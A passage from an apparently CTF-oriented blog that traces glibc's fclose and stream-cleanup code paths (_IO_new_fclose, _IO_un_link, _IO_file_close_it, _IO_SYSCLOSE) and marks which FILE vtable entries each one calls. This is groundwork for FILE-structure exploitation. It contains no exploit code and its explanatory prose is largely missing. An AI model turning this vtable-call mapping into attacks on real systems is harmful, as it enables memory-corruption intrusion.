class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">      &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">      <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment">         stream.  */</span></span><br><span class="line">          __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">        &#123;</span><br><span class="line">          fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">          fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">          freeres_list = fp;</span><br><span class="line">          fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">        _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">        _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment">     used.  */</span></span><br><span class="line">      fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_SETBUF (fp, NULL, 0)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SETBUF(*FP*, *BUFFER*, *LENGTH*) JUMP2 (__setbuf, FP, BUFFER, LENGTH)</span></span><br></pre></td></tr></table></figure><p><strong>! (fp-&gt;_flags &amp; _IO_UNBUFFERED) &amp;&amp; fp-&gt;_mode !&#x3D; 0</strong></p><p><mark>&#x3D;&#x3D;vatble__setbuf_IO_new_file_setbuf&#x3D;&#x3D;<mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_setbuf _IO_file_setbuf</span></span><br><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_file_setbuf (_IO_FILE *fp, <span class="type">char</span> *p, _IO_ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_default_setbuf (fp, p, len) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_setbuf, _IO_file_setbuf)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_default_setbuf (_IO_FILE *fp, <span class="type">char</span> *p, _IO_ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYNC(FP) JUMP0 (__sync, FP)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;vtable __sync _IO_default_setbuf&#x3D;&#x3D;<mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_default_setbuf (_IO_FILE *fp, <span class="type">char</span> *p, _IO_ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure><p>I&#x2F;O_IO_FILE_IO_FILE_IO_FILE-1</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="exit"><a href="#exit" class="headerlink" title="_exit()"></a>_exit()</h3><p>_exit</p><ol><li><code>_exit</code></li><li></li><li><code>init</code></li><li><code>SIGCHLD</code></li><li><code>_exit</code><code>status</code><code>wait</code></li></ol><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>TLSlibc, stdout</p><p>, task,, , </p><p>&#x3D;+cpu</p>]]></content>
      
      
      
        <tags>
            
            <tag> Exit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fclose</title>
      <link href="/2023/04/01/IO-FILE-fclose/"/>
      <url>/2023/04/01/IO-FILE-fclose/</url>
      
        <content type="html"><![CDATA[<p>raycp:<a href="https://xz.aliyun.com/t/5445">https://xz.aliyun.com/t/5445</a></p><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">(FILE *stream)</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">20</span>] = <span class="string">&quot;flag&#123;grxer&#125;&quot;</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fwrite(data,<span class="number">1</span>,<span class="number">0x20</span>,fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fclose</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401212041052.png" alt="image-20230401212041052"></p><h2 id="IO-new-fclose"><a href="#IO-new-fclose" class="headerlink" title="_IO_new_fclose"></a>_IO_new_fclose</h2><p><strong>include&#x2F;stdio.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fclose(fp) _IO_new_fclose(fp)</span></span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;iofclose.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _LIBC</span></span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">     the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_IS_FILEBUF</code> <code>fp</code> </p><h3 id="IO-un-link-"><a href="#IO-un-link-" class="headerlink" title="_IO_un_link "></a>_IO_un_link </h3><p>_IO_un_link ((struct _IO_FILE_plus *) fp)</p><p><strong>libio&#x2F;genops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> **<span class="title">f</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">    ;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">      <span class="keyword">if</span> (*f == (_IO_FILE *) fp)</span><br><span class="line">        &#123;</span><br><span class="line">          *f = fp-&gt;file._chain;</span><br><span class="line">          ++_IO_list_all_stamp;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_un_link)</span><br></pre></td></tr></table></figure><p>IO_link_in_IO_LINKED(0x80)IO_list_all_IO_list_allchain</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401221712640.png" alt="image-20230401221712640"></p><p>_IO_LINKED</p><h3 id="IO-file-close-it-"><a href="#IO-file-close-it-" class="headerlink" title="_IO_file_close_it "></a>_IO_file_close_it </h3><p><strong>libio&#x2F;fileops.c</strong></p><p>_IO_new_fclose _IO_file_close_it (fp);</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_close_it _IO_file_close_it</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_close_it (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> write_status;</span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write_status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">              ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free buffer. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_wbackup (fp))</span><br><span class="line">    _IO_free_wbackup_area (fp);</span><br><span class="line">      _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">      _IO_wsetg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      _IO_wsetp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  _IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  _IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);<span class="comment">//</span></span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">  fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">  fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_status ? close_status : write_status;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)</span><br></pre></td></tr></table></figure><p>(0x8)<code>_IO_CURRENTLY_PUTTING(0x800)</code></p><p>fwrite_IO_CURRENTLY_PUTTING</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401224153932.png" alt="image-20230401224153932"></p><img src="/2023/04/01/IO-FILE-fclose/image-20230401224234824.png" alt="image-20230401224234824" style="zoom:67%;"><h4 id="IO-do-flush-fp-"><a href="#IO-do-flush-fp-" class="headerlink" title="_IO_do_flush (fp) "></a>_IO_do_flush (fp) </h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">           (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">      || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">               &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">               ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fwrite_IO_SYSWRITE<mark>&#x3D;&#x3D;vtable__write<code>_IO_new_file_write</code>&#x3D;&#x3D;<mark></mark></mark></p><p></p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401230150953.png" alt="image-20230401230150953"></p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401230235192.png" alt="image-20230401230235192"></p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401230304718.png" alt="image-20230401230304718"></p><h4 id="IO-SYSCLOSE-fp-"><a href="#IO-SYSCLOSE-fp-" class="headerlink" title="_IO_SYSCLOSE(fp) "></a>_IO_SYSCLOSE(fp) </h4><p>_IO_new_file_close_it</p><blockquote><p><code>_IO_FLAGS2_NOCLOSE(32)</code> <code>fclose()</code>  <code>_IO_FLAGS2_NOCLOSE</code>  <code>fclose()</code> </p></blockquote><p>_IO_SYSCLOSE(fp)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSCLOSE(FP) JUMP0 (__close, FP)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;__close_IO_file_close&#x3D;&#x3D;<mark></mark></mark></p><p><strong>&#x2F;libio&#x2F;fileops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_close (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Cancelling close should be avoided if possible since it leaves an</span></span><br><span class="line"><span class="comment">     unrecoverable state behind.  */</span></span><br><span class="line">  <span class="keyword">return</span> close_not_cancel (fp-&gt;_fileno);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> close_not_cancel(fd) \</span></span><br><span class="line"><span class="meta">  __close (fd)</span></span><br></pre></td></tr></table></figure><img src="/2023/04/01/IO-FILE-fclose/image-20230401232801039.png" alt="image-20230401232801039" style="zoom:80%;"><p>close</p><h4 id="-"><a href="#-" class="headerlink" title=","></a>,</h4><p>**_IO_new_file_close_it**_mode&#x3D;-1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">_IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">_IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_buf_base_IO_buf_end_IO_USER_BUF</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="meta">    (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setp(__fp, __p, __ep) \</span></span><br><span class="line"><span class="meta">       ((__fp)-&gt;_IO_write_base = (__fp)-&gt;_IO_write_ptr \</span></span><br><span class="line"><span class="meta">    = __p, (__fp)-&gt;_IO_write_end = (__ep))</span></span><br></pre></td></tr></table></figure><p>macro</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((fp)-&gt;_IO_read_base = (<span class="literal">NULL</span>), (fp)-&gt;_IO_read_ptr = (<span class="literal">NULL</span>), (fp)-&gt;_IO_read_end = (<span class="literal">NULL</span>));</span><br><span class="line">((fp)-&gt;_IO_write_base = (fp)-&gt;_IO_write_ptr = <span class="literal">NULL</span>, (fp)-&gt;_IO_write_end = (<span class="literal">NULL</span>));</span><br></pre></td></tr></table></figure><p>read write</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">fp-&gt;_offset = _IO_pos_BAD;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401235020311.png" alt="image-20230401235020311"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="IO-new-file-finish"><a href="#IO-new-file-finish" class="headerlink" title="IO_new_file_finish"></a>IO_new_file_finish</h3><p> <strong>_IO_new_fclose</strong> _IO_FINISH (fp);</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FINISH(FP) JUMP1 (__finish, FP, 